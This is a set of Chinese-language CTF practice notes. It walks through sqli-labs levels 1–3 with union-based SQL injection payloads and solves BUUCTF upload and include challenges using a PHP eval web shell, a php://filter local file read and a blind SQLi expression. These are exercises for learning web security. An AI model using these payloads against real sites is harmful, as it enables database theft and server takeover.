## sqli-labs

### 0x01 搭建

为了方便一点，直接用docker拉镜像了

```dockerfile
docker search sqli-labs  #搜索
```

![image-20220713002056580](D:\Typora\note\CTF\web\web集训.assets\image-20220713002056580.png)

找到星级最高的

```dockerfile
docker pull acgpiano/sqli-labs  #下载
```

![image-20220713002129576](D:\Typora\note\CTF\web\web集训.assets\image-20220713002129576.png)

```
docker run --name sqli-labs -d -p 8080:80 acgpiano/sqli-labs  #启动
```

然后输入`ip:8080`就可进入sqli-labs

![image-20220713002309871](D:\Typora\note\CTF\web\web集训.assets\image-20220713002309871.png)

### 0x02 Less-1

因为是第一关嘛，所以没有任何过滤

先试试有几行数据返回

```sql
?id=1' order by 3;--+    #正常回显
?id=1' order by 4;--+    #无回显
```

说明有三行数据

然后联合查询查出数据库名

```sql
?id=0' union select 0,1,database();--+
```

查出数据库名`security`

然后查表名

```sql
?id=0' union select 0,table_schema,group_concat(table_name) from information_schema.tables where table_schema='security';--+
```

查出表名`emails,referers,uagents,users`

然后查出各表的列名

```sql
?id=0' union select 0,table_name,group_concat(column_name) from information_schema.columns where table_name='emails';--+
?id=0' union select 0,table_name,group_concat(column_name) from information_schema.columns where table_name='referers';--+
?id=0' union select 0,table_name,group_concat(column_name) from information_schema.columns where table_name='uagents';--+
?id=0' union select 0,table_name,group_concat(column_name) from information_schema.columns where table_name='users';--+
```

| 表名     | 列名                          |
| -------- | ----------------------------- |
| emails   | id,email_id                   |
| referers | id,referer,ip_address         |
| uagents  | id,uagent,ip_address,username |
| users    | id,username,password          |

要查数据的话就直接联合查询就好了

### 0x03 Less-2

相对于上关只是查询的语句没用引号包起来

上关的语句去掉0后面的单引号便可直接使用

### 0x03 Less-3

相对于第一关，查询的语句用单引号包裹后又用括号包了一次

在第一关的语句的`0'`后面加上`)`即可使用

## [ACTF2020 新生赛]Upload

先用bp抓包，随便上传一个图片

![image-20220713004304968](D:\Typora\note\CTF\web\web集训.assets\image-20220713004304968.png)

然后内容改为`<?php eval($_POST[1]);?>`

再改后缀，改成php或php4都不行，最后改为phtml发现可以，这样一句话木马就上传成功了

直接蚁剑连接找flag

![image-20220713004504451](D:\Typora\note\CTF\web\web集训.assets\image-20220713004504451.png)

## [ACTF2020 新生赛]Include

打开题目，点TIPS，发现URL上面有`?file=flag.php`

已经很明显了，直接用php伪协议读取

```web-idl
http://81ed096f-fe93-42cb-af08-1ced7427897d.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=flag.php
```

得到

```
PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OWZhYzkzZmMtMjAxMy00NjA5LWIzNWQtMTUzODJhODI3Y2Q1fQo=
```

base64解码得到

```php
<?php
echo "Can you find out the flag?";
//flag{9fac93fc-2013-4609-b35d-15382a827cd5}
```

```sql
1^(ascii(substr((select(flag)from(flag)),1,1)>0))^1
```

